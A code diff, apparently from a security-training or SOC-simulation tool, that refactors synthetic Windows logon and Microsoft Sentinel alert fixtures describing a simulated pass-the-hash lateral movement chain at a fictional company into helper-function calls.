-        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
-        "winlog.record_id": "9920551",
-        "winlog.event_data.SubjectUserSid": "S-1-0-0",
-        "winlog.event_data.SubjectUserName": "-",
-        "winlog.event_data.SubjectDomainName": "-",
-        "winlog.event_data.SubjectLogonId": "0x0",
-        "winlog.event_data.TargetUserSid": adminSid,
-        "winlog.event_data.TargetUserName": admin.sam,
-        "winlog.event_data.TargetDomainName": "NEXACORP",
-        "winlog.event_data.TargetLogonId": "0x8B03D19",
-        "winlog.event_data.LogonType": "3",
-        "winlog.event_data.LogonProcessName": "NtLmSsp ",
-        "winlog.event_data.AuthenticationPackageName": "NTLM",
-        "winlog.event_data.LmPackageName": "NTLM V2",
-        "winlog.event_data.KeyLength": "0",
-        "winlog.event_data.WorkstationName": fileSrv.hostname,
-        "winlog.event_data.IpAddress": fileSrv.ip,
-        "winlog.event_data.IpPort": "52140",
-        "winlog.event_data.ImpersonationLevel": "%%1833",
-        "winlog.event_data.ElevatedToken": "%%1842",
-        "event.code": "4624",
-        "event.action": "logged-in",
-        "event.outcome": "success",
-        "source.ip": fileSrv.ip,
-        "user.name": admin.sam,
-        "user.domain": "NEXACORP",
-      },
-    },
+    }),
 
-    // ─────────────────────────────────────────────────────────────────────
-    // 11. Microsoft Sentinel correlation (fed by Defender for Identity) — the
-    //     alert that opened the ticket, tying the chain across all three hosts.
-    // ─────────────────────────────────────────────────────────────────────
-    {
-      id: "evt_lm_11_sentinel_correlation",
-      ts: T(9 * MIN),
-      source: "siem",
-      vendor: "Microsoft Sentinel",
-      event_type: "ueba_anomaly",
-      hostname: fileSrv.hostname,
-      user_email: admin.email,
-      src_ip: foothold.ip,
-      severity: "critical",
-      mitre_technique: "T1550.002",
-      mitre_tactic: "Lateral Movement",
-      incident_id: INCIDENT,
-      description:
-        "Sentinel raised a correlation alert, enriched by Defender for Identity, for s.kessler: NTLM authentications traversing FIN-WS-11 → SRV-FILE-03 → DC-NEXA-01 in nine minutes off-hours, with the account's normal logon pattern attached for comparison.",
-      raw: {
-        "AlertName": "LateralMovement_PassTheHash_MultiHop",
-        "alert.rule.id": "SEN-IDENT-0342",
-        "alert.severity": "High",
-        "target.user.name": `NEXACORP\\${admin.sam}`,
-        "user.full_name": "Sofia Kessler",
-        "user.department": "IT Infrastructure",
-        "user.title": admin.title,
-        "user.group.name": ["Domain Users", "Server Operators", "Backup Operators"],
-        "host.name": fileSrv.hostname,
-        "threat.technique.id": "T1550.002",
-        "threat.technique.name": "Use Alternate Authentication Material: Pass the Hash",
-        "threat.tactic.name": "Lateral Movement",
-        "ExtendedProperties.DefenderForIdentity Detection": "Suspected identity theft (pass-the-hash)",
-        "ExtendedProperties.Authentication Package": "NTLM",
-        "ExtendedProperties.Hosts In Path": ["FIN-WS-11", "SRV-FILE-03", "DC-NEXA-01"],
-        "ExtendedProperties.Window Start": T(4 * MIN),
-        "ExtendedProperties.Window End": T(8 * MIN),
-        "ExtendedProperties.Usual Logon Hours": "08:00-19:00",
-        "ExtendedProperties.Usual Auth Protocol": "Kerberos",
-        "ExtendedProperties.Source Addresses In Window": [foothold.ip, fileSrv.ip],
-        "event.action": "correlation-alert",
-        "event.outcome": "alerted",
+    // 11. Sentinel correlation (Defender for Identity) — the multi-hop chain.
+    sentinelUeba({
+      companyId: cxNexa, id: "evt_lm_11_sentinel_correlation", ts: T(9 * MIN), user: admin.email, userSam: admin.sam, srcIp: foothold.ip,
+      alertName: "LateralMovement_PassTheHash_MultiHop", alertSeverity: "High", ruleId: "SEN-IDENT-0342", severity: "critical", eventType: "ueba_anomaly",
+      fullName: "Sofia Kessler", department: "IT Infrastructure", title: admin.title,
+      groups: ["Domain Users", "Server Operators", "Backup Operators"],
+      mitre: "T1550.002", threatTechnique: "Use Alternate Authentication Material: Pass the Hash", threatTactic: "Lateral Movement", incidentId: INCIDENT,
+      extendedProperties: {
+        "DefenderForIdentity Detection": "Suspected identity theft (pass-the-hash)",
+        "Authentication Package": "NTLM",
+        "Hosts In Path": ["FIN-WS-11", "SRV-FILE-03", "DC-NEXA-01"],
+        "Window Start": T(4 * MIN),
+        "Window End": T(8 * MIN),
+        "Usual Logon Hours": "08:00-19:00",
+        "Usual Auth Protocol": "Kerberos",
+        "Source Addresses In Window": [foothold.ip, fileSrv.ip],
       },
-    },
+      description:
+        "Sentinel raised a correlation alert, enriched by Defender for Identity, for s.kessler: NTLM authentications traversing FIN-WS-11 -> SRV-FILE-03 -> DC-NEXA-01 in nine minutes off-hours, with the account's normal logon pattern attached for comparison.",
+    }),
   ];
 
   const iocs: IOC[] = [
